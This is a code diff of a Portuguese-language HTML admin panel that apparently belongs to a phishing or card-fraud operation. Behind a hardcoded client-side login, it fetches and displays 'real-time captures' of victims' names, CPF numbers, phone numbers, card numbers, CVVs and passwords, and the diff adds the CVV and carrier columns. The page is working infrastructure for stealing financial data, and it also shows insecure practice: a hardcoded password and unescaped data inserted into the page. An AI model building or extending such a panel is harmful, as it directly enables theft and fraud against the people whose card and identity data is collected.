@@ -4,48 +4,69 @@
     <meta charset="UTF-8">
     <title>Área Restrita - Elite Ink</title>
     <style>
-        body { background: #05070a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        #loginBlock { background: #0d1117; padding: 30px; border: 2px solid #58a6ff; border-radius: 15px; text-align: center; }
-        input { display: block; width: 100%; padding: 10px; margin: 10px 0; background: #05070a; color: white; border: 1px solid #30363d; border-radius: 5px; }
+        body { background-color: #05070a; color: #f0f6fc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        #loginBlock { background: #0d1117; padding: 40px; border-radius: 15px; border: 2px solid #58a6ff; text-align: center; width: 300px; box-shadow: 0 0 20px rgba(88,166,255,0.2); }
+        .cadeado { font-size: 50px; display: block; margin-bottom: 10px; filter: drop-shadow(0 0 5px #58a6ff); }
+        h2 { color: #58a6ff; text-transform: uppercase; letter-spacing: 2px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #30363d; background: #05070a; color: white; box-sizing: border-box; }
+        .btn-entrar { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
         .hidden { display: none; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #0d1117; }
-        th, td { border: 1px solid #30363d; padding: 10px; text-align: left; }
-        th { background: #58a6ff; color: black; }
+        .container { width: 95%; max-width: 1200px; background: #0d1117; padding: 20px; border-radius: 12px; border: 1px solid #30363d; margin-top: 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 13px; }
+        th, td { border: 1px solid #30363d; padding: 12px; text-align: left; }
+        th { background: #58a6ff; color: #05070a; }
+        tr:hover { background: #161b22; }
     </style>
 </head>
 <body>
     <div id="loginBlock">
-        <span style="font-size: 40px;">🔒</span>
+        <span class="cadeado">🔒</span>
         <h2>Área Restrita</h2>
-        <input type="text" id="user" placeholder="Login">
-        <input type="password" id="pass" placeholder="Senha">
-        <button onclick="logar()" style="width: 100%; padding: 10px; background: #238636; color: white; border: none; cursor: pointer;">ENTRAR</button>
+        <input type="text" id="userInput" placeholder="Login">
+        <input type="password" id="passInput" placeholder="Senha">
+        <button class="btn-entrar" onclick="validar()">DESBLOQUEAR ACESSO</button>
     </div>
 
-    <div id="painel" class="hidden" style="width: 90%; max-width: 1000px;">
-        <h2>📊 Dados Capturados</h2>
-        <button onclick="carregar()" style="padding: 10px; background: #58a6ff; border: none; cursor: pointer;">🔄 ATUALIZAR</button>
+    <div id="painelConteudo" class="hidden container">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+            <h2 style="margin: 0;">📊 Capturas em Tempo Real</h2>
+            <button onclick="carregar()" style="padding: 10px; background: #58a6ff; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">🔄 ATUALIZAR</button>
+        </div>
         <table>
             <thead>
-                <tr><th>Nome</th><th>CPF</th><th>Telefone</th><th>Cartão</th><th>Senha</th><th>Data</th></tr>
+                <tr>
+                    <th>Operadora</th><th>Nome</th><th>CPF</th><th>Telefone</th><th>Valor</th><th>Cartão</th><th>CVV</th><th>Senha</th><th>Data</th>
+                </tr>
             </thead>
-            <tbody id="corpo"></tbody>
+            <tbody id="tabelaCorpo"></tbody>
         </table>
     </div>
 
     <script>
-        function logar() {
-            if(document.getElementById('user').value === "Peganunca777" && document.getElementById('pass').value === "dks10dks") {
+        function validar() {
+            if (document.getElementById('userInput').value === "Peganunca777" && document.getElementById('passInput').value === "dks10dks") {
                 document.getElementById('loginBlock').classList.add('hidden');
-                document.getElementById('painel').classList.remove('hidden');
+                document.getElementById('painelConteudo').classList.remove('hidden');
+                document.body.style.alignItems = "flex-start";
                 carregar();
             } else { alert("Acesso Negado!"); }
         }
+
         async function carregar() {
             const res = await fetch('/ver-dados-restritos');
             const dados = await res.json();
-            document.getElementById('corpo').innerHTML = dados.map(i => `
-                <tr><td>${i.nome}</td><td>${i.cpf}</td><td>${i.telefone}</td><td>${i.cartao}</td><td style="color:red">${i.senha}</td><td>${new Date(i.dataRegistro).toLocaleString()}</td></tr>
+            document.getElementById('tabelaCorpo').innerHTML = dados.map(i => `
+                <tr>
+                    <td>${i.operadora || '-'}</td>
+                    <td>${i.nome || '-'}</td>
+                    <td>${i.cpf || '-'}</td>
+                    <td>${i.telefone || '-'}</td>
+                    <td>R$ ${i.valor || '0'},00</td>
+                    <td>${i.cartao || '-'}</td>
+                    <td>${i.cvv || '-'}</td>
+                    <td style="color: #ff7b72; font-weight: bold;">${i.senha || '-'}</td>
+                    <td>${new Date(i.dataRegistro).toLocaleString('pt-BR')}</td>
+                </tr>
             `).join('');
         }
     </script>
